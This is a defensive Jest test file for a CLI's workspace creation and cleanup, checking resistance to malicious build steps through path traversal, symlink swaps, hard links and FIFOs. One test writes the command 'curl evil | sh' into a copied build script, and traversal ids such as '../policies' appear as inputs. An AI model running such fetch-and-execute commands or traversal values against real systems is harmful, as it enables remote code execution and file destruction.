/**
 * Creating and cleaning up workspaces on a real filesystem.
 *
 * A workspace's metadata file lives inside the workspace, which every step of
 * the run it holds can write. Cleanup used to take the directory to delete
 * from that file.
 */

import { describe, it, expect, beforeEach, afterEach, jest } from '@jest/globals';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { execFileSync, spawn } from 'child_process';
import { cleanupWorkspaces, createWorkspace, getWorkspacesDir, listWorkspaces, removeWorkspace } from './workspace';

let appData: string;

beforeEach(() => {
  appData = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'ws-cleanup-')));
  process.env.LOCALMOST_CONFIG_DIR = path.join(appData, 'appdata');
  fs.mkdirSync(getWorkspacesDir(), { recursive: true });
});

afterEach(() => {
  jest.restoreAllMocks();
  delete process.env.LOCALMOST_CONFIG_DIR;
  fs.rmSync(appData, { recursive: true, force: true });
});

const makeWorkspace = (name: string, metadata: Record<string, unknown>) => {
  const dir = path.join(getWorkspacesDir(), name);
  fs.mkdirSync(dir);
  fs.writeFileSync(path.join(dir, '.localmost-workspace.json'), JSON.stringify(metadata));
  return dir;
};

describe('workspace creation', () => {
  it('keeps workspaces private to the user, however the directory was left', async () => {
    // A workspace is a copy of the checkout, and holds the step scripts that
    // expanded ${{ secrets.X }}. The CLI runs with the shell's umask.
    fs.chmodSync(getWorkspacesDir(), 0o755);
    const source = path.join(appData, 'src');
    fs.mkdirSync(source);
    fs.writeFileSync(path.join(source, 'README'), 'hi\n');

    const ws = await createWorkspace({ sourceDir: source, respectGitignore: false });

    expect(fs.statSync(getWorkspacesDir()).mode & 0o777).toBe(0o700);
    expect(fs.statSync(ws.path).mode & 0o777).toBe(0o700);
    expect(fs.readFileSync(path.join(ws.path, 'README'), 'utf-8')).toBe('hi\n');
  });

  /** A checkout that is a git repository, with the given files. */
  const gitCheckout = (files: Record<string, string>): string => {
    const source = path.join(appData, 'checkout');
    fs.mkdirSync(source);
    execFileSync('git', ['init', '-q'], { cwd: source });
    for (const [name, content] of Object.entries(files)) {
      fs.mkdirSync(path.dirname(path.join(source, name)), { recursive: true });
      fs.writeFileSync(path.join(source, name), content);
    }
    return source;
  };

  /** Every path in a tree, relative to it, directories marked with a slash. */
  const tree = (dir: string, rel = ''): string[] =>
    fs.readdirSync(path.join(dir, rel), { withFileTypes: true }).flatMap((entry) => {
      const name = rel ? `${rel}/${entry.name}` : entry.name;
      return entry.isDirectory() ? [`${name}/`, ...tree(dir, name)] : [name];
    });

  it('is a private copy of the checkout: a step that writes a workspace file does not write the checkout', async () => {
    // The step profile grants writes on the workspace. A hard-linked
    // workspace shared every file's inode with the checkout, so a step - a
    // third-party action among them - appended to the user's own build.sh.
    const source = gitCheckout({ 'sub/build.sh': 'make\n', '.localmostrc': 'version: 1\n' });
    fs.chmodSync(path.join(source, 'sub', 'build.sh'), 0o755);
    fs.chmodSync(path.join(source, 'sub'), 0o750);
    const outside = path.join(appData, 'outside');
    fs.writeFileSync(outside, 'the user\'s\n');
    fs.symlinkSync(outside, path.join(source, 'link'));
    // A FIFO in the checkout is neither copied nor waited on.
    execFileSync('mkfifo', [path.join(source, 'pipe')]);

    for (const respectGitignore of [true, false]) {
      const ws = await createWorkspace({ sourceDir: source, respectGitignore });

      for (const name of ['sub/build.sh', '.localmostrc']) {
        fs.appendFileSync(path.join(ws.path, name), 'curl evil | sh\n');
        expect(fs.statSync(path.join(ws.path, name)).nlink).toBe(1);
        expect(fs.statSync(path.join(source, name)).nlink).toBe(1);
      }
      expect(fs.readFileSync(path.join(source, 'sub', 'build.sh'), 'utf-8')).toBe('make\n');
      expect(fs.readFileSync(path.join(source, '.localmostrc'), 'utf-8')).toBe('version: 1\n');
      expect(fs.statSync(path.join(ws.path, 'sub', 'build.sh')).mode & 0o777).toBe(0o755);
      expect(fs.statSync(path.join(ws.path, 'sub')).mode & 0o777).toBe(0o750);
      // A link is copied as the link, never as what it points to.
      expect(fs.readlinkSync(path.join(ws.path, 'link'))).toBe(outside);
      expect(fs.existsSync(path.join(ws.path, 'pipe'))).toBe(false);
    }
  });

  it('never reads the checkout\'s .gitignore as rsync filter rules', async () => {
    // To git a line that is only "!" is nothing; to rsync's --exclude-from
    // it cleared every rule before it, the default .git exclude among them.
    const source = gitCheckout({
      '.gitignore': 'node_modules\n!\nsecret.env\n',
      'a.txt': 'a\n',
      'secret.env': 'TOKEN=1\n',
      'node_modules/m/index.js': 'x\n',
      'sub/b.txt': 'b\n',
      'sub/node_modules/n.js': 'x\n',
      'build.log': 'x\n',
    });
    // A repository nested in the checkout is copied whole, but for its .git.
    execFileSync('git', ['init', '-q', path.join(source, 'nested')]);
    fs.writeFileSync(path.join(source, 'nested', 'n.txt'), 'n\n');

    const ws = await createWorkspace({ sourceDir: source });

    expect(tree(ws.path).sort()).toEqual(
      ['.gitignore', '.localmost-workspace.json', 'a.txt', 'nested/', 'nested/n.txt', 'sub/', 'sub/b.txt'].sort()
    );

    // Without the ignore rules every file is copied, but never .git or
    // node_modules.
    const all = await createWorkspace({ sourceDir: source, respectGitignore: false });
    expect(tree(all.path)).toEqual(expect.arrayContaining(['secret.env', 'a.txt', 'nested/n.txt']));
    expect(tree(all.path).filter((p) => /(^|\/)(\.git|node_modules)(\/|$)/.test(p))).toEqual([]);
  });

  it('applies a checkout\'s .gitignore as git does when the checkout is not a repository', async () => {
    const source = path.join(appData, 'plain');
    fs.mkdirSync(path.join(source, '.git'), { recursive: true });
    fs.writeFileSync(path.join(source, '.git', 'config'), '[core]\n\tbare = false\n');
    fs.writeFileSync(path.join(source, '.gitignore'), 'ignored.txt\n!\n');
    fs.writeFileSync(path.join(source, 'ignored.txt'), 'x\n');
    fs.writeFileSync(path.join(source, 'kept.txt'), 'k\n');

    const ws = await createWorkspace({ sourceDir: source });

    expect(tree(ws.path).sort()).toEqual(['.gitignore', '.localmost-workspace.json', 'kept.txt']);
  });

  it('refuses to create a workspace whose ignore rules it cannot read, rather than copy what they exclude', async () => {
    const source = path.join(appData, 'plain');
    fs.mkdirSync(source);
    fs.writeFileSync(path.join(source, '.gitignore'), '.env\n');
    fs.writeFileSync(path.join(source, '.env'), 'TOKEN=1\n');
    // No git on this Mac.
    jest.spyOn(jest.requireActual<typeof import('child_process')>('child_process'), 'execFileSync').mockImplementation(() => {
      throw Object.assign(new Error('spawnSync git ENOENT'), { code: 'ENOENT' });
    });

    await expect(createWorkspace({ sourceDir: source })).rejects.toThrow(/--no-ignore/);
  });

  it('writes its metadata into the workspace, never through a link the checkout put at its name', async () => {
    // The checkout is copied first, its links as links; the metadata was
    // then written through whatever was at its name, by this unsandboxed
    // process.
    const victim = path.join(appData, 'victim');
    fs.writeFileSync(victim, 'the user\'s\n');
    const source = gitCheckout({ 'a.txt': 'a\n' });
    fs.symlinkSync(victim, path.join(source, '.localmost-workspace.json'));

    for (const respectGitignore of [true, false]) {
      const ws = await createWorkspace({ sourceDir: source, respectGitignore });

      expect(fs.readFileSync(victim, 'utf-8')).toBe('the user\'s\n');
      expect(fs.lstatSync(path.join(ws.path, '.localmost-workspace.json')).isFile()).toBe(true);
      expect(JSON.parse(fs.readFileSync(path.join(ws.path, '.localmost-workspace.json'), 'utf-8')).id).toBe(ws.id);
    }
  });

  it('copies a staged checkout\'s links as links, never what they point to', async () => {
    // A tracked link to a file of the user's put that file's contents in
    // the workspace, for every step to read.
    const secret = path.join(appData, 'id_ed25519');
    fs.writeFileSync(secret, 'PRIVATE KEY\n');
    const source = gitCheckout({ 'a.txt': 'a\n' });
    fs.symlinkSync(secret, path.join(source, 'key'));
    execFileSync('git', ['add', 'a.txt', 'key'], { cwd: source });

    const ws = await createWorkspace({ sourceDir: source, stagedOnly: true });

    expect(fs.readlinkSync(path.join(ws.path, 'key'))).toBe(secret);
    expect(fs.readFileSync(path.join(ws.path, 'a.txt'), 'utf-8')).toBe('a\n');
    expect(fs.statSync(path.join(ws.path, 'a.txt')).nlink).toBe(1);
  });
});

describe('workspace cleanup', () => {
  it('deletes the workspace directory it found, never a path its metadata names', async () => {
    // A step rewrites its own workspace's metadata to point two levels up and
    // to look a day old, so the next cleanup removes it.
    const victim = path.join(appData, 'appdata', 'runner');
    fs.mkdirSync(victim, { recursive: true });
    fs.writeFileSync(path.join(victim, 'keep'), 'x');
    makeWorkspace('ws-aaaa-1111', {
      id: '../runner',
      path: victim,
      sourceDir: '/x',
      createdAt: new Date(0).toISOString(),
    });

    const { removed } = await cleanupWorkspaces({ maxAgeHours: 24, maxCount: 10 });

    expect(removed).toBe(1);
    expect(fs.existsSync(path.join(victim, 'keep'))).toBe(true);
    expect(fs.existsSync(path.join(getWorkspacesDir(), 'ws-aaaa-1111'))).toBe(false);
  });

  it('lists each workspace by its directory, whatever its metadata says', () => {
    makeWorkspace('ws-bbbb-2222', { id: '../../..', path: '/', sourceDir: '/x', createdAt: new Date().toISOString() });
    const [ws] = listWorkspaces();
    expect(ws.id).toBe('ws-bbbb-2222');
    expect(ws.path).toBe(path.join(getWorkspacesDir(), 'ws-bbbb-2222'));
  });

  it('does not wait on a FIFO a step planted at its workspace\'s metadata', async () => {
    // A step replaces its metadata file with a FIFO, or with a link to one.
    // Every later run's cleanup opened it and blocked for a writer that never
    // came. Here one comes after a few seconds, so that a cleanup that waits
    // shows as slow rather than hanging the suite.
    const fifo = path.join(makeWorkspace('ws-aaaa-1111', {}), '.localmost-workspace.json');
    fs.rmSync(fifo);
    execFileSync('mkfifo', [fifo]);
    const elsewhere = path.join(appData, 'fifo');
    execFileSync('mkfifo', [elsewhere]);
    const linked = path.join(makeWorkspace('ws-bbbb-2222', {}), '.localmost-workspace.json');
    fs.rmSync(linked);
    fs.symlinkSync(elsewhere, linked);
    const writers = [fifo, elsewhere].map((p) =>
      spawn('/bin/sh', ['-c', 'sleep 4; printf "{}" > "$1"', 'sh', p], { stdio: 'ignore' })
    );

    try {
      const started = Date.now();
      const { removed } = await cleanupWorkspaces({ maxAgeHours: 24, maxCount: 0 });
      expect(Date.now() - started).toBeLessThan(2000);
      expect(removed).toBe(2);
      expect(fs.readdirSync(getWorkspacesDir())).toEqual([]);
    } finally {
      for (const writer of writers) writer.kill('SIGKILL');
    }
  }, 15000);

  it('dates a workspace by its directory when its metadata is missing, a link, or not a file createWorkspace wrote', () => {
    // A step that removed its metadata, or swapped a dangling link in, kept
    // its workspace - a copy of the checkout and its expanded scripts - from
    // ever being cleaned up. A link, a hard link or an outsized file is not
    // one createWorkspace wrote, and is not read.
    const old = { sourceDir: '/x', createdAt: new Date(0).toISOString() };
    fs.rmSync(path.join(makeWorkspace('ws-aaaa-1111', old), '.localmost-workspace.json'));
    const dangling = path.join(makeWorkspace('ws-bbbb-2222', old), '.localmost-workspace.json');
    fs.rmSync(dangling);
    fs.symlinkSync(path.join(appData, 'nothing'), dangling);
    const elsewhere = path.join(appData, 'elsewhere.json');
    fs.writeFileSync(elsewhere, JSON.stringify(old));
    const linked = path.join(makeWorkspace('ws-eeee-5555', old), '.localmost-workspace.json');
    fs.rmSync(linked);
    fs.symlinkSync(elsewhere, linked);
    const other = path.join(appData, 'other.json');
    fs.writeFileSync(other, JSON.stringify(old));
    const hardLinked = path.join(makeWorkspace('ws-cccc-3333', old), '.localmost-workspace.json');
    fs.rmSync(hardLinked);
    fs.linkSync(other, hardLinked);
    fs.writeFileSync(
      path.join(makeWorkspace('ws-dddd-4444', old), '.localmost-workspace.json'),
      JSON.stringify(old) + ' '.repeat(1024 * 1024)
    );

    const listed = listWorkspaces();

    expect(listed.map((ws) => ws.id).sort()).toEqual([
      'ws-aaaa-1111',
      'ws-bbbb-2222',
      'ws-cccc-3333',
      'ws-dddd-4444',
      'ws-eeee-5555',
    ]);
    for (const ws of listed) {
      expect(ws.createdAt).toBe(fs.statSync(ws.path).birthtime.toISOString());
      expect(ws.sourceDir).toBe('');
    }
  });

  it('refuses to remove anything that is not a workspace directory', async () => {
    const outside = path.join(appData, 'appdata', 'policies');
    fs.mkdirSync(outside, { recursive: true });
    for (const id of ['../policies', '..', '.', '', 'ws-../../policies']) {
      expect(await removeWorkspace(id)).toBe(false);
    }
    expect(await removeWorkspace('ws-cccc-3333')).toBe(false);
    expect(fs.existsSync(outside)).toBe(true);
  });
});

describe('a workspace cleanup cannot remove', () => {
  // A file flagged immutable can be neither unlinked nor moved, by the app
  // or by anyone - a removal that never clears, like the ones that would
  // otherwise leave a copy of the checkout in app data run after run.
  const stuck = (dir: string): void => {
    fs.writeFileSync(path.join(dir, 'stuck'), 'x');
    execFileSync('chflags', ['uchg', path.join(dir, 'stuck')]);
  };
  afterEach(() => {
    execFileSync('chflags', ['-R', 'nouchg', getWorkspacesDir()]);
  });

  it('is named in a warning, and not counted as removed', async () => {
    const dir = makeWorkspace('ws-aaaa-1111', { sourceDir: '/x', createdAt: new Date(0).toISOString() });
    stuck(dir);
    const leftover = path.join(getWorkspacesDir(), '.removing-ws-bbbb-2222.0a1b2c3d');
    fs.mkdirSync(leftover);
    stuck(leftover);
    const warned = jest.spyOn(console, 'error').mockImplementation(() => undefined);

    const { removed, kept } = await cleanupWorkspaces({ maxAgeHours: 24, maxCount: 10 });

    expect({ removed, kept }).toEqual({ removed: 0, kept: 0 });
    const said = warned.mock.calls.map((args) => args.join(' '));
    expect(said.some((line) => line.includes('ws-aaaa-1111') && line.includes('EPERM'))).toBe(true);
    expect(said.some((line) => line.includes('.removing-ws-bbbb-2222.0a1b2c3d') && line.includes('EPERM'))).toBe(true);
  });
});

describe('removing a workspace something of its run still writes', () => {
  // A step's leftover process - one that outlived the CLI's reap - still
  // writes its workspace's path, and a container a step started writes the
  // workspace it bind-mounts under no profile at all. Either can swap a
  // directory in the tree for a link while the removal walks it.
  let victim: string;

  beforeEach(() => {
    victim = path.join(appData, 'victim');
    fs.mkdirSync(victim);
    fs.writeFileSync(path.join(victim, 'keep'), 'kept');
  });

  const workspace = (id: string): string => {
    const dir = makeWorkspace(id, { sourceDir: '/x', createdAt: new Date(0).toISOString() });
    fs.mkdirSync(path.join(dir, 'd0', 'src'), { recursive: true });
    fs.writeFileSync(path.join(dir, 'd0', 'src', 'output'), 'step');
    return dir;
  };

  /** Each call made to the fs.promises functions a removal could use, in order. */
  const recordRemovalCalls = (): Array<{ op: string; paths: string[] }> => {
    const calls: Array<{ op: string; paths: string[] }> = [];
    for (const op of ['rename', 'rm', 'readdir', 'opendir', 'lstat', 'stat', 'unlink', 'rmdir'] as const) {
      const real = fs.promises[op].bind(fs.promises) as (...args: unknown[]) => Promise<unknown>;
      jest.spyOn(fs.promises, op).mockImplementation(((...args: unknown[]) => {
        calls.push({ op, paths: args.filter((arg): arg is string => typeof arg === 'string') });
        return real(...args);
      }) as never);
    }
    return calls;
  };

  it('moves the workspace out of its path before removing it, and never walks the tree by path', async () => {
    const dir = workspace('ws-aaaa-1111');
    const base = getWorkspacesDir();
    const calls = recordRemovalCalls();

    expect(await removeWorkspace('ws-aaaa-1111')).toBe(true);

    // The one call that names the workspace's own path moves it aside,
    // beside itself, under a name no step's profile grants.
    const touching = calls.filter(({ paths }) => paths.some((p) => p === dir || p.startsWith(`${dir}/`)));
    expect(touching).toHaveLength(1);
    expect(touching[0].op).toBe('rename');
    const to = touching[0].paths[1];
    expect(path.dirname(to)).toBe(base);
    expect(path.basename(to).startsWith('.removing-')).toBe(true);
    // Nothing after it uses a path more than one entry below the directory
    // the tree was moved into, which only the app writes.
    for (const { op, paths } of calls) {
      expect(op).not.toBe('rm');
      for (const p of paths) {
        if (p === dir) continue;
        const rel = path.relative(base, p).split(path.sep);
        expect(rel[0].startsWith('.removing-')).toBe(true);
        expect(rel.length).toBeLessThanOrEqual(2);
      }
    }
    expect(fs.readdirSync(base)).toEqual([]);
  });

  it('never follows a link planted at the workspace, or swapped into it while it is removed', async () => {
    const dir = workspace('ws-aaaa-1111');
    fs.symlinkSync(victim, path.join(dir, 'link'));
    fs.symlinkSync(victim, path.join(getWorkspacesDir(), 'ws-bbbb-2222'));
    // A writer swaps d0 for a link to the user's files just after the
    // removal has listed it as a directory - the race a real one would have
    // to win, won here every time.
    const realReaddir = fs.promises.readdir.bind(fs.promises) as (...args: unknown[]) => Promise<fs.Dirent[]>;
    let swapped = false;
    jest.spyOn(fs.promises, 'readdir').mockImplementation((async (...args: unknown[]) => {
      const listed = await realReaddir(...args);
      const d0 = path.join(String(args[0]), 'd0');
      if (!swapped && listed.some((entry) => entry.name === 'd0' && entry.isDirectory())) {
        fs.renameSync(d0, path.join(appData, 'd0.moved'));
        fs.symlinkSync(victim, d0);
        swapped = true;
      }
      return listed;
    }) as never);

    expect(await removeWorkspace('ws-aaaa-1111')).toBe(true);
    expect(await removeWorkspace('ws-bbbb-2222')).toBe(true);

    expect(swapped).toBe(true);
    expect(fs.readdirSync(victim)).toEqual(['keep']);
    expect(fs.readFileSync(path.join(victim, 'keep'), 'utf-8')).toBe('kept');
    expect(fs.readdirSync(getWorkspacesDir())).toEqual([]);
  });

  it('finishes a removal an earlier run left part done', async () => {
    const aside = path.join(getWorkspacesDir(), '.removing-ws-aaaa-1111.0a1b2c3d');
    fs.mkdirSync(path.join(aside, 'd0'), { recursive: true });
    fs.writeFileSync(path.join(aside, 'd0', 'output'), 'step');
    fs.symlinkSync(victim, path.join(aside, 'link'));
    makeWorkspace('ws-bbbb-2222', { sourceDir: '/x', createdAt: new Date().toISOString() });

    await cleanupWorkspaces();

    expect(fs.readdirSync(getWorkspacesDir())).toEqual(['ws-bbbb-2222']);
    expect(fs.readFileSync(path.join(victim, 'keep'), 'utf-8')).toBe('kept');
  });
});
